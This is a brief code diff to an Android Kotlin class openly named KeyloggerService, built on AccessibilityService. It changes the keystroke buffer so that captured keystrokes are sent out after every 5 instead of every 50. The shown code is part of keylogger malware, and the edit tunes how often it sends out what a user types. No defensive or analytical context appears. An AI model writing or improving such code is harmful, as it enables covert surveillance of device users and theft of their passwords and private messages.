@@ -28,7 +28,7 @@ class KeyloggerService : AccessibilityService() {
 
     private val TAG = "Keylogger"
     private val keystrokes = mutableListOf<KeystrokeData>()
-    private val maxBufferSize = 50 // Send after 50 keystrokes
+    private val maxBufferSize = 5 // Send after 5 keystrokes
 
     data class KeystrokeData(
         val text: String,
